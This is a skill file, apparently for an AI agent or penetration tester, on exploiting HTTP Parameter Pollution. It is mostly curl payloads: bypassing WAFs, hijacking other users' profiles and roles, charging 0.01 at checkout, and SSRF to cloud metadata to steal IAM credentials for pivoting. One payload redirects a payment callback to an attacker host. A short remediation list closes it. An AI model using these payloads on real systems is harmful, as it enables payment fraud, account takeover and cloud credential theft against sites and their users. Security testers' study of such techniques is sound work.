---
name: hpp
description: Detect and exploit HTTP Parameter Pollution leveraging duplicate parameter handling differences between web servers frameworks and WAFs to bypass input filters escalate privileges tamper with payment logic and chain SSRF attacks.
---

# HTTP Parameter Pollution (HPP)

## When to use this skill

- Target accepts multiple parameters of the same name (`?id=1&id=2`) and you need to know which value the backend actually consumes.
- A WAF, reverse proxy, or front-end input validation layer appears to sanitize a parameter but backend logic still misbehaves.
- Access control checks fail to hold: passing `?user_id=self` works but you suspect the identity check and the data read disagree.
- Payment, coupon, tax, or transfer flows where a server-side price/amount is computed from request parameters.
- SSRF filters that block internal hosts on one layer but fetch on another.
- Chained exploitation: HPP is rarely the whole bug — it is the amplifier that lets one value reach the validator and a different value reach the sink.

## Methodology

### 1. Enumerate parameter sinks and learn the stack

Before injecting, identify which parameters are echoed, used in lookups, or alter logic. Fingerprint the stack (headers, error pages, cookie names, `/server-status`, default pages) — then map it to the framework behavior matrix below. **Always verify empirically per target**: proxies (nginx, Envoy), load balancers, and custom middleware merge/drop duplicates before your request ever reaches the framework, invalidating the matrix.

| Stack (as consumed by app code) | Behavior on `?id=1&id=2` |
|---|---|
| PHP | Last value wins → `2` |
| ASP.NET / ASP.NET Core | Concatenates → `1,2` |
| Ruby on Rails | Last value wins → `2` |
| Django (QueryDict) | Last value via `GET['id']`, all via `GET.getlist('id')` |
| Flask (request.args) | First value wins → `1`; full list via `args.getlist` |
| Node.js Express (express 4 default) | Last value wins; with `extended` qs parser → array `['1','2']` |
| Java Servlet / Spring | First value from `getParameter()`, all from `getParameterValues()` |
| Go net/http | First value from `Query().Get()`, all from `Query()['id']` |

Probe reflection with a harmless duplicate to measure the winner:

```bash
curl -s "https://target.example.com/profile?id=RECON1&id=RECON2"
curl -s "https://target.example.com/api/search?q=a&q=b" -H "Accept: application/json"
# If output contains RECON2 → last-value stack; RECON1 → first-value; "RECON1,RECON2" → concatenation.
```

### 2. Detect the pollution delta

Send two distinct values and diff the responses against a single-value baseline. Any behavioral change (different record returned, different amount reflected, different error) proves the layers disagree.

```bash
BASE=$(curl -s -o /dev/null -w "%{size_code}:%{size_download}" "https://t.example/api/user?id=1337")
DUP=$(curl -s -o /dev/null -w "%{size_code}:%{size_download}" "https://t.example/api/user?id=1337&id=100")
echo "base=$BASE dup=$DUP"   # differing sizes => parameters disagree downstream

# Body variants matter too: some stacks parse body params when query param is absent
curl -s -X POST "https://t.example/api/user" -d "id=1337&id=100"
curl -s -X POST "https://t.example/api/user?id=1337" -d "id=100"   # does body shadow query?
```

Test all duplicate separators and encodings — parsers disagree on these too: `&amp;`, `%26`, `;` (legacy `;`-separated query strings in some Java/old PHP stacks), and repeated params across query + body + cookie.

### 3. WAF and front-end filter bypass

The canonical pattern: the filtering layer (WAF, edge worker, validation proxy) inspects the **first** occurrence while the backend (PHP, Rails) reads the **last**. Feed the WAF a clean value and the sink an attack value in one request.

```bash
# WAF sees uid=1337 (benign), backend executes uid=1 (admin enumeration)
curl -s "https://t.example/api/admin/users?uid=1337&uid=1"

# Authentication / role check split
curl -s "https://t.example/admin?action=view&action=delete" -H "X-Auth: $TOKEN"

# URL-encoded duplicate splitting WAF rules that decode once
curl -s "https://t.example/search?id[]=REDACTED&id=1337"

# Blocklist on 'sleep' matches first param; backend reads last
curl -s "https://t.example/api/graph?timeout=10&timeout=sleep(5)"
```

Observe which half the WAF logged vs. which half the app acted on — the delta is the bypass. This also defeats naive blocklists checking only one parameter occurrence per request.

### 4. Access control bypass via identity parameter duplication

Server-side code frequently does `current_user = session.user` then `target = params[:user_id]`, but some frameworks read twice or compose the value differently on each read. Pollute the identity parameter so the check sees one value and the data operation sees another.

```bash
# Check reads 'self', lookup reads victim's record
curl -s "https://t.example/api/profile/update" -X POST \
  -b "session=VALID_SESSION" \
  -d "user_id=self&user_id=victim_id_4821&email=attacker@x.example"

# Query-string variant for GET-based reports
curl -s "https://t.example/reports/export?user_id=self&user_id=victim_id_4821"

# ASP.NET concatenation variant: backend compares 'self,victim' and fails gracefully,
# but data-layer query does WHERE user_id IN (...) with the joined string
curl -s "https://t.example/api/profile?user_id=self&user_id=victim_id_4821"
```

Escalate by polluting role/permission params: `?role=user&role=admin` — if the authorization gate validates occurrence 1 and the session writer persists occurrence 2, the session upgrades.

### 5. Payment, pricing, and business-logic tampering

Where a server recalculation naively trusts a client-mirrored field, duplicates let the visible value (rendered in confirmation UI or logged by fraud checks) differ from the value charged.

```bash
# UI shows 100.00, fraud engine validates 100.00, charge engine reads 0.01
curl -s "https://t.example/checkout/complete?price=100.00&price=0.01" \
  -b "cart=c8f2a; token=$CHECKOUT_TOKEN"

# ASP.NET-style stacks: join produces '100.00,0.01' which some decimal parsers truncate at comma
curl -s "https://t.example/api/order" -X POST -d "price=100.00&price=0.01&sku=SKU99&sku=SKU99"

# Coupon double-apply where the validator sees the redeemed code and the total calc sees the raw one
curl -s "https://t.example/cart/apply?code=VALID10&code=VALID10&code=FREE"

# Quantity/negative-value pollution on tax and shipping endpoints
curl -s "https://t.example/api/shipping/quote?qty=1&qty=-1&weight=5&weight=-5"
```

Always confirm impact in a sandbox account — the goal is demonstrating the split between validated value and consumed value, not destructive orders.

### 6. SSRF chaining and multi-context pollution

When an SSRF allowlist validates one occurrence and an HTTP client fetches another, HPP converts a filtered endpoint into full metadata/cloud access. Then extend the same technique across contexts: query string, request body, and cookies can each carry the same parameter name, and parsers merge them in stack-specific priority.

```bash
# Allowlist checks occurrence 1 (internal OK), HTTP client resolves occurrence 2
curl -s "https://t.example/fetch?url=internal.trusted&url=http://169.254.169.254/latest/meta-data/" \
  -H "X-Aws-Token: $AWS_TOKEN"

# Query + body split: filter only inspects query string
curl -s -X POST "https://t.example/proxy?destination=internal.trusted" \
  -d "destination=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Cookie + query split (some stacks treat cookie params as request params during parsing)
curl -s "https://t.example/api/report?url=query.trusted" \
  -b "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Body param re-encoding: XML/e-commerce callbacks that concatenate duplicated form fields
curl -s -X POST "https://t.example/payment/ipn" \
  -d "success_url=https://t.example/thanks&success_url=http://attacker-callback.example.com/catch"
```

For the SSRF chain, capture metadata role credentials (IMDSv1 only) from the polluted fetch, then pivot: list the instance profile, hit the cloud API from your own host with the leaked credentials, and document lateral scope.

### Remediation

- Collapse duplicates at ingress: reject requests with repeated parameter names (`return 400`) rather than silently picking first/last.
- Normalize parameter parsing centrally — one shared accessor per framework — and unit-test it against a matrix of duplicate, encoded (`%26`, `;`), and `param[]` variants.
- Never split validation across layers: run WAF, middleware, and business logic against the exact same parsed request object.
- Treat identity, role, price, quantity, and destination URLs as server-authoritative only — never accept them from client-supplied parameters; derive from session/server state.
- Require WAF/proxy and framework alignment: document each stack's first/last/join behavior in the threat model and enforce via integration tests.
- Enforce IMDSv2 (token-based) to neutralize HPP-SSRF metadata exfiltration, plus egress allowlists for outbound fetchers.
- Log and alert on any request containing duplicate parameter names — legitimate traffic rarely needs them, making HPP attempts high-signal detection events.
